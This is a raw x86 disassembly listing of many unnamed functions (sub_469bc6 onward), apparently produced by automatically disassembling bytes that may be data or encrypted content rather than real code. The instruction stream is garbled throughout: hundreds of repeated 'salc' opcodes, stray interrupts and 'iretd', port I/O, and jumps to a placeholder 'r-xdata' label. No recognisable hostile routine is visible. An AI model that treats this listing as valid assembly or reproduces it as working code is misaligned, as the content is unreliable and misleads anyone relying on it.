retn
sub_469bc6
mov ebx 0xb916b9b9
adc [ edx ] ah
scasd [ edi ]
mul [ edx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
xchg ebp eax
dec ebx
inc esi
inc esi
salc
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
push esp
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0xb98bd9af
mov ecx 0xd6d6d6d6
salc
dec ecx
retn 0x4ce1
sub_469c16
add al [ edi ]
mov eax 0x4650ccaf
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_469c47
mov ecx 0x56462eb9
inc esi
inc esi
scasd [ edi ]
out dx al
pop edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_469c5e
or ah [ edx + 0xe ]
pop ss
push ss
and bh cl
add ah [ edx + 0x1e ]
mov ecx 0x4646a2d0
inc esi
inc esi
mov [ esi + 0x46 ] 0xaf
or al 0x95
mov ecx 0xb9d6d6b9
xor esp [ esi + 0x46ded1b9 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
dec edx
dec ecx
retn 0x464d
inc esi
inc esi
jg r-xdata
rcr esi 0x1
inc esi
and bh cl
cmp ecx [ edi + ebp * 4 - 0x4646633c ]
salc
salc
salc
salc
salc
sub al 0x35
and bh cl
adc esp [ esi + 0x4641e5af ]
inc esi
salc
salc
salc
salc
salc
retn
sub_469ce4
xchg [ ecx - 0x3e ] cl
mov edi 0x2c46464a
inc esi
mov ecx 0x4646ead0
inc esi
mov al [ cs : esi + 0x46 ]
inc esi
sub al 0x46
adc [ edi + 0x46464a9a ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb edi [ edi + ebp * 4 - 0x46465c19 ]
salc
salc
salc
salc
salc
salc
salc
jg r-xdata
inc esi
adc [ edi + 0x46465263 ] ebp
salc
dec ecx
retn 0xb147
mov edx 0xb9bc29af
mov ecx 0x49d6d6d6
retn
sub_469d48
mov ecx 0xba3bc5b9
inc esi
scasd [ edi ]
sahf
mov bh 0xb9
mov ecx 0xcf20d6d6
add edi [ edx - 0x2e50798b ]
push esi
inc esi
inc esi
salc
salc
iretd
sub_469db0
add esi [ edx - 0x6750b9d4 ]
nop
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
mov ecx 0x47cdba37
int 0xf
mov esi 0xb9a3f2af
mov ecx 0xd6d6d6d6
dec ecx
shl [ ebp + 0xb9b999 ] 0x7d
mov dh 0x49
les ecx [ edi + ebx * 2 ]
inc esi
inc esi
scasb [ edi ]
insb
inc esi
inc esi
int 0xb6
jge r-xdata
salc
salc
salc
adc [ ebp - 0x47 ] esi
adc [ ecx ] edx
scasd [ edi ]
cld
inc ebp
inc esi
inc esi
salc
sub al 0x4e

dec ecx
retn 0x998d
sub_469df7
out 0xb3 al
mov ecx 0xbaa2afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
inc esi
inc esi
inc esi
dec esi
sub al 0x6
iretd
sub_469e70
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
sar [ ebp - 0x7d3a4647 ] 0x52
mov dl 0x47
inc esi
inc esi
mov ecx 0x32b94e11
bound ecx [ esi - 0x47 ]
adc [ edx - 0x51 ] ebp
xor [ ecx - 0x29294647 ] esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xfaf6cd10
inc esi
inc esi
inc esi
jne r-xdata
popad
push ecx
inc esi
inc esi
salc
int 0xbe
retn
adc [ edi + 0x46464dc0 ] ebp
salc
and bh cl
adc ebx [ esp + ebx - 0x466c0d51 ]
mov ecx 0xd6d6d6d6
salc
salc
jne r-xdata
inc ecx
inc esi
inc esi
inc esi
push ss
mov ecx 0x4646ead0
inc esi
scasb [ edi ]
0xafb9b998 0xb584
adc [ esi ] dl
and bh cl
adc esp [ eax - 0x49f430e0 ]
scasd [ edi ]
and ebx [ eax - 0x3d344647 ]
sub_469ee0
fiadd [ esi + 0x46 ]
inc esi
scasd [ edi ]
xor [ ebx - 0x29294647 ] dh
salc
int 0xd
push ds
scasb [ edi ]
sub dl [ ebx - 0x51e04647 ]
pop ecx
cwde
mov ecx 0x47bec5b9
dec ecx
retn 0x5c91
sub_469f01
inc esi
inc esi
jne r-xdata
adc ebx [ esp + ebx - 0x466c0d51 ]
mov ecx 0xd6d6d6d6
salc
salc
jne r-xdata
jg r-xdata
inc ecx
inc esi
inc esi
inc esi
push ss
mov ecx 0x4646ead0
inc esi
scasb [ edi ]
0xafb9b998 0xb584
adc [ esi ] dl
and bh cl
adc esp [ eax - 0x49f430e0 ]
scasd [ edi ]
and ebx [ eax - 0x3d344647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb esp [ eax - 0x33 ]
sahf
scasd [ edi ]
xchg esi eax
push esi
inc esi
inc esi
salc
salc
adc ecx ebp
stosb [ edi ]
bound esi [ edx + 0x49 ]
retn
sub_469f74
push 0x44
inc esi
inc esi
adc eax 0xb9ac5eaf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
retn 0xb9a3
sub_469fa0
mov ecx 0x465351af
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x46
mov ecx 0xbecd3e10
retn
sub_469fb6
mov ecx 0x4ef5c249
inc esi
inc esi
mov ecx 0x4eaf4a33
mov bh 0xb9
mov ecx 0xd6d6d6d6
salc
sub al 0x29
push ds
sub al 0x36
and bh cl
add edx [ esi - 0x4659fd51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
inc ebp
add edx [ esi - 0x51 ]
pop ds
xchg esi eax
mov ecx 0xcdd6d6b9
add edi [ edx + 0x542f149 ]
int 0x42
rol [ ebp + 0x3 ] 0x4e
scasd [ edi ]
test al 0x89
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edi - 0x411550bc ]
mov ecx 0xcd11d6b9
mov esp 0xaf6bbcc5
mov ch 0x51
inc esi
inc esi
salc
salc
salc
salc
salc
mov ecx 0x4caf5611
push ebp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ edx + eax ] ch
jne r-xdata

sub_46a0a3
std
xchg esp eax
mov ecx 0xd68518b9
salc
salc
salc
salc
salc
salc
salc
adc [ ecx ] edx
adc [ 0xffffffffb99071af ] edx
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x52ce4a0b
inc edi
push es
lds edi [ ebx ]
dec edx
inc esi
dec ecx
retn
sub_46a182
adc ebx [ esi - 0x30df6833 ]
adc ebx [ esp + ebx - 0x30df88d4 ]
adc ebx [ edx - 0x467a2851 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
and bh cl
sbb esi esp
and bh cl
or eax [ eax - 0x6732d0d4 ]
pop ds
scasd [ edi ]
js r-xdata
salc
salc
salc
salc
salc
salc
push es
scasd [ edi ]
pop edx
inc esi
inc esi
sub al 0x45
adc [ edi + eax * 2 ] ebp
inc esi
inc esi
inc esi
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
mov ecx 0x4646aad0
inc esi

sub_46a1c4
cmp [ edx - 0x51e94647 ] 0x4a
mov dh 0xb9
mov ecx 0xb179af06
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46a203
cmp edi [ esi - 0x5081ef47 ]
and [ edx + 0x46 ] edx
inc esi
stosd [ edi ]
je r-xdata
salc
and bh cl
add edx [ edx + 0x465016af ]
inc esi
salc
salc
salc
salc
salc
dec ecx
int1
add [ edx - 0x35 ] dl
add dh [ esi + 0x5e ]
scasd [ edi ]
cmp [ eax - 0x29294647 ] cl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x36b94a36
dec esi
scasd [ edi ]
sbb eax [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x1
and bh cl
adc ebx esp
sbb al 0x2c
xor esp [ eax ]
iretd
test al 0x15
iretd
sub_46a23f
cld
push ebx
inc esi
inc esi
adc eax 0x46ea53b9
inc esi
inc esi
scasd [ edi ]
int 0x51
inc esi
inc esi
salc
salc
salc
and bh cl
add edx [ edx + 0x465016af ]
inc esi
salc
salc
salc
salc
salc
dec ecx
int1
add [ edx - 0x35 ] dl
add dh [ esi + 0x5e ]
scasd [ edi ]
cmp [ eax - 0x29294647 ] cl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x36b94a36
dec esi
scasd [ edi ]
sbb eax [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x1
and bh cl
adc ebx esp
sbb al 0x2c
xor esp [ eax ]
iretd
sub_46a2cb
pop ebx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
scasd [ edi ]
add edx [ edi + 0x46 ]
inc esi
and bh cl
adc ebp [ eax + 0x20 ]
iretd
sub_46a2f8
inc ecx
inc esi
inc esi
inc esi
push ss
mov ecx 0x11b9a233
sbb al ch
cmp edi [ edx - 0x3cb6b9 ]
mov ah 0xb9
mov ecx 0x2e7200cd
jpe r-xdata
salc
salc
salc
salc
salc
sbb ch cl
sbb [ ecx ] 0xd6d6851b
salc

push ds
iretd
sub_46a32f
sbb ebx [ esi - 0x4645cc47 ]
xor esp [ edx + 0x422c96b9 ]
inc esi
jbe r-xdata
mov ecx 0xb903cb16
push ss

inc esi
mov ecx 0x11af1630
0xd6d6b9b9 0xd6d6
salc
salc
salc
salc
salc
salc
salc
salc
push ss
scasd [ edi ]
0xb982
sub_46a37a
add edi [ ecx - 0x46fc7fea ]
inc esi
scasb [ edi ]
adc ch [ eax - 0x34e94647 ]
add edi [ ecx - 0x6d3c34ea ]
mov ebx 0xae16b9b9
push edi
stosb [ edi ]
mov ecx 0x5682c5b9
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edi - 0x721450bc ]
mov ecx 0x4986c3b9
retn 0x464e
sub_46a3b8
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi
sub al 0x6
inc [ esi + 0x56 ]
inc esi
inc esi
inc esi
jbe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
in al 0xcf
or esp [ edx - 0x785dfc33 ]
mov esi 0x4947ee59
retn 0xa27d
inc esi
push ss
sub al 0x46
iretd
sub_46a408
push esi
inc edx
inc esi
inc esi
scasd [ edi ]
arpl [ ecx + edi * 4 - 0x29292947 ] di
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
in al 0xcf
or esp [ edx - 0x785dfc33 ]
mov esi 0x4947ee59
retn 0xa27d
sub_46a4b0
add ebx [ esi - 0x50dad3e2 ]
cwde
cmp [ ecx - 0x29292947 ] 0xcd13d6d6
stosb [ edi ]
pop ss
pop ss
scasd [ edi ]
xor ch [ ebp + 0x23c5b9b9 ]
mov edx 0xba03cb46
push ss
mov ecx 0x47bec591
scasd [ edi ]
rcpps xmm0 [ esi + 0x46 ]
salc
salc
salc
salc
and al al
mov ch 0x33
adc edi ecx
sbb [ esi ] cl
scasb [ edi ]
mov dl 0x89
mov ecx 0x7200cfb9
in al 0xe0
daa
lodsd [ esi ]
scasd [ edi ]
jl r-xdata
salc
salc
salc
salc
salc
salc
salc
and bh cl
add edx [ eax + 0x20352c1e ]
iretd
mov ecx 0xd6d6d6b9
salc
salc
and bl al
xchg esp eax
dec ecx
retn 0x4b55
sub_46a51d
mov ecx 0x13d6d6b9
int 0xaa
lds ebp [ edx + 0x1e272c56 ]
sub al 0x30
scasd [ edi ]
mov [ esi + 0x381b9b9 ] 0xaa
or ecx [ 0x3810b10 ]
xchg edx eax
or ebp [ edi ]
and eax 0x9e038134
sub [ 0x3812029 ] esi
0x300e6632 0x381
adc [ eax ] 0xb
xor [ edi ] esp
add [ ebx ] 0x1023348e
or eax [ ecx + 0x27318a03 ]
xor al 0x23
add [ ebx ] 0x28231ef2
adc [ ecx + 0xb0bfe03 ] al
push ds
and eax [ ecx + 0x1028fa03 ]
or ecx [ ebx ]
scasb [ edi ]
mov al 0x4e
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0xc24986c3
nop
xchg ebp eax
mov ecx 0x920bcbb9

sub_46a5ca
idiv [ ebx + 0x4faeb9b9 ]
cmp [ ecx + 0x4986c3b9 ] 0xb99eebc3
mov ecx 0xaf8e3bcb
or dh [ edx - 0x29294647 ]
salc
mov ecx 0x4646ead0
inc esi
mov ecx 0xaf464646
push esp
xchg [ ecx - 0x29292947 ] bh
salc
salc
salc
sbb [ eax ] ebx
test esi edx
salc
push es
scasd [ edi ]
inc edx
xchg [ ecx - 0x29292947 ] edi
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
or eax [ edx - 0x511dfc35 ]
mov ecx [ esi + 0x46 ]
inc esi
retn
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
mov ecx 0x33b9ba33
mov [ 0x155a11b9 ] al
mov ecx 0xd1b9ae33
fiadd [ esi + 0x46 ]
inc esi
jg r-xdata
scasd [ edi ]
in eax 0x84
mov ecx 0xd6d6d6b9
salc
salc
scasb [ edi ]
or eax 0xafb9b9be
push ebp
sahf
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec edx
dec ecx
retn 0x9acb
sub_46a7cd
inc esp
inc esi
inc esi
insd
xchg [ edi - 0x46464bc4 ] ebp
salc
adc eax 0x7d1611b9
test [ edi + 0x46464046 ] ebp
salc
salc
salc
salc
salc
int 0x3b
push esi

sub_46a7ed
add edi [ edx + 0x4336af16 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
push edx
aaa
add [ ebp - 0x4a ] bh
dec ecx
les esp [ 0xffffffffaf464653 ]
mov [ 0xffffffffd6b9b9bb ] al
salc
salc
sub al 0x35
sbb [ eax ] ah
iretd
sub_46a820
add esi [ edx - 0x7f32e5d4 ]
and bh cl
add esi [ eax + 0x3cf201e ]
mov esi 0x49af8675
push ebx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xaf11b633
stosb [ edi ]
mov ch 0xb9
mov ecx 0xcbd6d6d6
retn
sub_46a8e8
cmp esi esp
int 0xbc
sub al 0x3e
and bh cl
cmp esi edx
sbb [ edi - 0x46467495 ] ebp
jne r-xdata
mov esi 0xd6b9b9b3
salc
salc
salc
push ds
and bh cl
add edx [ edx - 0x46722051 ]
mov ecx 0xd6d6d6d6
salc
lds esp [ ebx ]
mov edx 0x1f762c46
and cl ch
inc edi
int 0x6
dec esi
iretd
and bh cl
add esi [ esi ]

sub_46a903
xor ebp [ esi ]
int 0x33
cmp dl [ esi ]
scasd [ edi ]
insb
push ecx
inc esi
inc esi
salc
salc
salc
salc
and bl al
xchg [ edi - 0x464676ae ] ch
salc
salc
salc
adc [ eax ] dl
scasd [ edi ]
aaa
dec edi
inc esi
inc esi

sub_46a925
add ah [ edx + 0x62 ]
push ss
dec ecx
int1
inc ecx
push ss
and ch cl
add [ eax + 0x45 ] eax
add ah [ edx + 0x66 ]
dec ecx
int1
xchg [ esi ] dl
int 0x80
scasb [ edi ]
or [ esi + eax * 2 + 0x46 ] dl
lds eax [ edx + 0x6202cf4a ]
push esi
retn
sub_46a949
xchg [ edi - 0x4646582c ] ch
salc
salc
salc
salc
salc
and bh cl
add edi [ esi + ebx - 0x464a4e51 ]
mov ecx 0xe0af0ed6
mov bh [ ecx + 0x1516d6b9 ]
mov ecx 0x3cd0210
mov edx 0xcf4a0bcd
inc edi
adc eax 0xb9b1ebaf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
int 0x3
dec esi
sub al 0x46
mov ecx 0x86c30a16
dec ecx
retn 0xb2ec
sub_46a9c7
inc esi
inc esi
pop es
scasd [ edi ]
test [ ebp + 0x46 ] edx
inc esi
and bh cl
adc eax [ esi - 0x73c430e0 ]
scasd [ edi ]
sbb al 0x81
mov ecx 0x9d02aeb9
mov ecx 0x4a82c5b9
adc [ esi + 0x46464879 ] ch
pop ds
retn
sub_46a9f9
xchg [ ecx - 0x3e ] cl
das
xchg [ ecx - 0x46b9d347 ] bh
shr dl 0x1
inc esi
inc esi
inc esi
test [ cs : esi + 0x46 ] eax
inc esi
sub al 0x46
adc [ edi - 0x464679f6 ] ch
salc
salc
salc
salc
and ch al
jle r-xdata
salc
salc
and ch al
cmp eax 0xc2494600
dec ebp
inc esi
inc esi
scasd [ edi ]
out dx eax
mov ebx 0xd6d6b9b9
salc
and ch al
jg r-xdata
inc esi
lds edi [ edx ]
bound edx [ edx + 0x46 ]
dec ecx
retn
int 0x87
dec ecx
retn 0xbbe6
sub_46aa2f
mov ecx 0x4303afb9
inc esi
inc esi
salc
salc
salc
salc
sbb al 0xaf
cdq
push esi
inc esi
inc esi
salc
retn
sub_46aa42
mov al 0x49
enter 0x8f96 0xb9
mov ecx 0xb98fe5af
mov ecx 0xd6d6d6d6
int 0xb6
scasd [ edi ]
adc esi [ ebx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and ch al
cmp eax 0xc2494600
dec ebp
inc esi
inc esi
inc esi
lds edi [ edx ]
bound edx [ edx + 0x46 ]
dec ecx
retn
sub_46aace
mov ecx 0xae1615b9
or [ ecx + edi * 4 + 0x4e03cdb9 ] bl
int 0x36
jpe r-xdata
inc esi
inc esi
iretd
mov dh 0x49
int1
add [ edx - 0x51 ] dl
cmp dl [ esi - 0x29294647 ]
int 0xb8
and bh cl
cmp eax [ edx - 0x4132efd4 ]
scasd [ edi ]
push 0x44
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46ab2f
inc ebx
inc esi
inc esi
inc esi
add [ edx ] 0x62
push esi
inc esi
jg r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
bound esi [ edx + 0x49 ]
retn
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
scasd [ edi ]
inc edx
stc
mov ecx 0xd6d6d6b9
salc
int 0xb8
scasb [ edi ]
xor ch [ eax + 0x64afb9b9 ]
inc edi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46ab6c
add ah [ edx + 0x62 ]
scasd [ edi ]
adc al 0x9d
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
scasd [ edi ]
inc edx
stc
mov ecx 0xd6d6d6b9
salc
int 0xb8
scasb [ edi ]
xor ch [ eax + 0x64afb9b9 ]
inc edi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46abd6
xchg [ ecx - 0x3d ] cl
cwde
sahf
mov ecx 0x94af15b9
sahf
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3a

sub_46ac7e
scasd [ edi ]
push esi
xchg esp eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_46ac91
xlat
push edx
inc esi
inc esi
scasd [ edi ]
stosd [ edi ]
mov edi [ ecx - 0x29292947 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp edi esi
int 0xbc
and bh cl
cmp edi esp
scasd [ edi ]
adc eax [ edi - 0x7d3a4647 ]
dec edx
jpo r-xdata
inc esi
inc esi
sub al 0x42
inc esi
jbe r-xdata
lodsb [ esi ]
inc esi
inc esi
dec ecx
ror [ esi + 0x46 ] 0x46
inc esi
mov esi 0xb946466c
adc [ esi + 0x7f ] cl
sbb ah [ edx + 0x52 ]
dec ecx
retn 0x9ac5
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
inc esi
adc [ 0x46c6d0b9 ] edx
inc esi
inc esi
iretd
sub_46acd8
mov ecx 0x27eef9b9
inc esi
inc esi
add [ edx ] 0x7cde5e62
inc esi
inc esi
sub al 0x42
inc esi
jbe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
inc esi
adc [ 0x46c6d0b9 ] edx
inc esi
inc esi
iretd
sub_46ad42
into
inc esp
inc esi
inc esi
dec [ ebx ]
sbb al 0x46
inc esi
adc eax 0x4e7f2010
scasd [ edi ]
xor eax 0xd6b9b9f9
salc
salc
salc
salc
adc eax 0x860aaf10
mov ecx 0xd6d6d6b9
salc
adc [ edi - 0x46465efd ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi

scasd [ edi ]
movsd [ edi ] [ esi ]
mov ch 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
mov ecx 0x1bcf9a33
sahf
scasd [ edi ]
0xd6b9b9bc 0xd6d6
sub_46ad9b
salc
salc
mov cl 0x9e
pop ebp
xchg [ ecx - 0x297a7062 ] dh
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x9c
sub al 0x25
and bh cl
sbb ecx [ esi ]
scasd [ edi ]
mov bh 0x46
inc esi
inc esi
salc
salc
salc
lds edi [ edi + 0x7c34974 ]
dec eax
inc esi
inc esi
scasd [ edi ]
mov ch 0x8c
mov ecx 0xd6d6d6b9
scasb [ edi ]
stosb [ edi ]
inc ebp
inc esi
inc esi
retn
sub_46ae02
idiv [ ebx - 0x3d504647 ]
mov ebp 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
sbb [ 0xffffffffd6d6d685 ] bl
salc
salc
salc
salc
salc
salc
and bh cl
add esp [ esi + 0x20352c1e ]
iretd
sub_46b217
pop ds
inc esp
inc esi
inc esi
jne r-xdata
mov ecx 0x3cf20d6
mov edx 0xcb5613cb
retn
scasd [ edi ]
mov ah 0xbd
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
sub eax 0x4280439d
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
int 0xaa
pop ss
sub al 0x6
jne r-xdata
int 0x1b
mov edx 0x97455dcd
iretd
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
pop ss
scasd [ edi ]
shl [ eax - 0x29294647 ] cl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
scasd [ edi ]
sub dh [ esi - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46b24c
push cs
inc esp
sub eax 0x8f2d4386
inc ebx
scasd [ edi ]
mov al 0x9d
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xaa
pop ss
sub al 0x6
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
pop ss
scasd [ edi ]
shl [ eax - 0x29294647 ] cl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
scasd [ edi ]
sub dh [ esi - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46b27c
xchg [ ecx - 0x21 ] cl
xchg ebp ecx
xchg [ edi - 0x2929297b ] ecx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_46b2cd
cmp [ edx + 0x46 ] eax
dec ecx
rcr [ eax ] 0xf0
mov ecx 0x6222c5b9
bound eax [ esi - 0x51 ]
add dh [ eax - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
je r-xdata
sub al 0x56

retn
sub_46b325
mov ebx 0xc8afb9b9
inc esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
adc eax 0xcf5211b9
xchg esi eax
mov ebx 0x86c3b9b9
dec ecx
retn
sub_46b350
xchg esi eax
mov ebx 0x1516b9b9
scasd [ edi ]
sbb edx [ esi - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp ecx
mov esi 0x46eed1b9
inc esi
inc esi
retn
sub_46b3f0
and cl [ esi + eax * 2 + 0x46 ]
adc eax 0xbecd1110
jne r-xdata
jle r-xdata
jge r-xdata
retn
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x22
adc [ edi - 0x46465925 ] ebp
salc
salc
salc
push ss
int 0xb1
scasb [ edi ]
mov [ 0xffffffffc5b9b99d ] eax
adc [ esi - 0x51 ] 0xd4
cmp [ ecx + 0x13d6d6b9 ] 0x3cdaacd
dec esi
scasd [ edi ]
mov edi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x8ffe
sub_46b44b
xchg [ ecx - 0x21 ] cl
xchg ebp ecx
xchg [ edi - 0x2929297b ] ecx
salc
salc
salc
salc
salc
adc eax 0x9cfbaf16
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
pop ecx
int 0xb4
insd
mov [ edi - 0x46465243 ] ebp
salc
salc
and bh cl
adc edi [ ebp + ecx * 8 - 0x42 ]
and bh cl
cmp esi [ esi - 0x46741751 ]
mov ecx 0xd6d6d6d6
salc
and ch al
jpe r-xdata
mov esi 0x95ae80cd
mov bh [ ecx + 0x47bec5b9 ]
dec ecx
retn
inc esi
scasd [ edi ]
cmp [ eax - 0x29294647 ] ecx
salc
salc
salc
salc
salc
adc eax 0x46ead0b9
inc esi
inc esi
scasd [ edi ]
in al dx
mov ebp 0xafd6b9b9
outsd
cmp [ ecx - 0x29292947 ] 0xd6d6d6d6
salc
salc
salc
salc
sub al 0x56

sub_46b505
mov ecx 0x82edafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xbe
inc edx
inc edi
inc esi
inc esi

sub_46b534
mov ecx 0x1e642cb9
sub al 0x63
scasd [ edi ]
cmpsb [ esi ] [ edi ]
mov esi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
